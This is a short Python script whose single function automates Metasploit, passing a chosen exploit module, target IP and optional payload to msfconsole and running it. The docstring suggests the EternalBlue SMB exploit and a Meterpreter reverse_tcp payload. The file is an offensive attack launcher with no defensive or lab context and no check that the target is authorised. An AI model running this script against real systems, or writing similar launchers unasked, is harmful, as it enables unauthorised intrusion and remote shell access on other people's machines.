import subprocess
import platform
import os

def run_exploit(msf_module, target_ip, payload=None):
    """
    Launches a Metasploit exploit module against the target IP.
    Args:
        msf_module (str): Metasploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
        target_ip (str): Target IP address
        payload (str, optional): Metasploit payload (e.g., windows/x64/meterpreter/reverse_tcp)
    """
    msf_command = f"use {msf_module}; set RHOSTS {target_ip};"
    if payload:
        msf_command += f" set PAYLOAD {payload};"
    msf_command += " run; exit"

    if platform.system().lower().startswith("win"):
        msf_path = "msfconsole.bat"  # Windows Metasploit
    else:
        msf_path = "msfconsole"      # Linux/Unix Metasploit

    print(f"[*] Launching exploit {msf_module} on {target_ip}...")
    try:
        subprocess.run([msf_path, "-q", "-x", msf_command], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Exploit failed: {e}")
    except FileNotFoundError:
        print("[!] Metasploit not found. Please install it and add to PATH.")
